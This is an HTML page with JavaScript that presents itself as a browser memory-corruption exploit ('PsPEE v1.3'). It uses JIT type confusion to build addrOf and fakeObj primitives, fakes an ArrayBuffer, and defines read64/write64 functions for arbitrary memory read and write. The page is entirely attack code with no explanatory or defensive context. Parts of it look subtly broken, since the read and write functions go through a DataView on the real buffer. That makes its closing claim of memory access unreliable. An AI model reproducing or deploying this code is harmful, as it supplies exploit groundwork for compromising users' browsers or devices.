<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: black; color: lime; font-family: monospace; }
        #log { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="log"></div>
    <script>
        const log = msg => logDiv.textContent += msg + "\n";
        const logDiv = document.getElementById("log");

        const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
        const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];

        log("[*] PsPEE v1.3 - Memory R/W Setup");

        // Type confusion exploit
        let float_arr = [1.1, 2.2, 3.3];
        let obj_arr = [{}, {}, {}];

        function confuse(o) {
            let tmp = [1.1, 2.2, 3.3];
            tmp[1] = o;
            return tmp[1];
        }

        for (let i = 0; i < 10000; i++) confuse(2.2);

        // addrOf
        function addrOf(obj) {
            obj_arr[0] = obj;
            return f2i(confuse(obj_arr));
        }

        // fakeObj
        function fakeObj(addr) {
            float_arr[0] = i2f(addr);
            return confuse(float_arr);
        }

        log("[*] Creating primitives...");

        // Setup memory
        let ab = new ArrayBuffer(0x100);
        let ab_addr = addrOf(ab);
        log("[+] ArrayBuffer @ " + ab_addr.toString(16));

        // Read its backing store
        let dv = new DataView(ab);
        let container = {
            jsCellHeader: i2f(0x0108200700000000n), // JSObject cell
            butterfly: ab_addr,                    // Simulate valid
            vectorLength: i2f(0x100),
            backingStore: i2f(ab_addr + 0x20n),    // Offset to real backingStore
            fake: ab
        };

        let containerAddr = addrOf(container);
        log("[+] Fake container @ " + containerAddr.toString(16));

        // Create fake backing ArrayBuffer
        let fakeAb = fakeObj(containerAddr + 0x20n);

        // R/W primitives
        function read64(addr) {
            container.backingStore = i2f(addr);
            return f2i(dv.getFloat64(0, true));
        }

        function write64(addr, val) {
            container.backingStore = i2f(addr);
            dv.setFloat64(0, i2f(val), true);
        }

        // Test
        let obj = {a: 13.37};
        let objAddr = addrOf(obj);
        log("[+] Object @ " + objAddr.toString(16));

        let leak = read64(objAddr);
        log("[+] Leak: " + leak.toString(16));

        log("[*] You now have memory R/W access!");
    </script>
</body>
</html>
